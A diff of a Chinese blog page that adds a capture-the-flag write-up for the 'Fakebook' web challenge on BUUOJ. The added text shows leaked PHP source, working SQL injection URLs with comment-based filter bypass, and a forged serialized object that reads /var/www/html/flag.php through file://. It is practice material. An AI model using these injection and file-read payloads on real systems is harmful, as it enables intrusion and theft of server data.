@@ -27,16 +27,19 @@
     var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
   </script>
 
-  <meta name="description" content="flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}">
+  <meta name="description" content="2018网鼎杯的Fakebook。 上来允许Login和Join，Join会让我们输入用户名、密码、年龄和博客，输入这个东西有点意思。不能以http开头，不能出现127.0.0.1，随便输入www.baidu.com，通过。然后我们可以通过view.php?no&#x3D;1来得到详细信息，以及Blog的内容。SSRF没跑了。 扫源码，发现有robots.txt，user.php.bak，下载得源码。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUOJ刷题-Web-Fakebook">
 <meta property="og:url" content="http://tiaonmmn.github.io/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/index.html">
 <meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
-<meta property="og:description" content="flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}">
+<meta property="og:description" content="2018网鼎杯的Fakebook。 上来允许Login和Join，Join会让我们输入用户名、密码、年龄和博客，输入这个东西有点意思。不能以http开头，不能出现127.0.0.1，随便输入www.baidu.com，通过。然后我们可以通过view.php?no&#x3D;1来得到详细信息，以及Blog的内容。SSRF没跑了。 扫源码，发现有robots.txt，user.php.bak，下载得源码。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-09-02T03:29:03.000Z">
-<meta property="article:modified_time" content="2020-09-02T03:29:03.515Z">
+<meta property="article:modified_time" content="2020-09-02T08:08:50.200Z">
 <meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Unserialize">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
 
 
@@ -277,8 +280,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2020-09-02 11:29:03" itemprop="dateCreated datePublished" datetime="2020-09-02T11:29:03+08:00">2020-09-02</time>
+      <time title="创建时间：2020-09-02 11:29:03 / 修改时间：16:08:50" itemprop="dateCreated datePublished" datetime="2020-09-02T11:29:03+08:00">2020-09-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -320,14 +324,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>42</span>
+      <span>3.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>3 分钟</span>
     </span>
 </div>
 
@@ -338,8 +342,16 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        
-    <div id="aplayer-RRpFCgPT" class="aplayer aplayer-tag-marker meting-tag-marker"
+        <p>2018网鼎杯的Fakebook。</p>
+<p>上来允许Login和Join，Join会让我们输入用户名、密码、年龄和博客，输入这个东西有点意思。不能以http开头，不能出现127.0.0.1，随便输入www.baidu.com，通过。然后我们可以通过view.php?no=1来得到详细信息，以及Blog的内容。SSRF没跑了。</p>
+<p>扫源码，发现有robots.txt，user.php.bak，下载得源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">    </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>isValidBlog限制有点严，只允许http(s)协议，要想办法变成gopher或者file协议。</p>
+<p>注意到view.php?no=1，随手加个单引号，发现MySQL报错？<code>union select</code>被Ban，那就用注释绕过，然后手注。<code>http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,database(),3,4%23</code>，得到当前数据库为fakebook，<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27%20limit%201),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select table_name from information_schema.tables where table_schema='fakebook' limit 1),3,4%23)</code>，当前表名为users，<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20limit%201,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select column_name from information_schema.columns where table_schema='fakebook' limit 1,1),3,4%23)</code>，得到users表字段为：no、username、passwd、data。<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20data%20from%20users%20limit%200,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select data from users limit 0,1),3,4%23)</code>得到data的内容，返回<code>O:8:"UserInfo":3:&#123;s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:13:"www.baidu.com";&#125;</code>，反序列化串内容正好对应user.php.bak里的UserInfo类。</p>
+<p>那么，猜测一下view.php的逻辑，从数据库获取对应no的行，然后反序列化data，并显示到页面上去。那么，我们如果我们修改了反序列化串，就可以使得blog的地址不受isValidBlog()的限制。</p>
+<p>随手测一下flag.php，发现存在。那么file://读就可以了。构造反序列化串<code>O:8:"UserInfo":3:&#123;s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;</code>，然后访问<code>http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(2),3,'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'%23</code>，即可得到flag.php内容。</p>
+
+    <div id="aplayer-pSwTjvPY" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="343502" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
     ></div>
 <p>flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}</p>
@@ -368,6 +380,11 @@
 </ul>
 </div>
 
+          <div class="post-tags">
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          </div>
 
         
 
@@ -437,14 +454,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">298k</span>
+    <span title="站点总字数">301k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:31</span>
+    <span title="站点阅读时长">4:33</span>
   </span>
 </div>
 <div class="busuanzi-count">
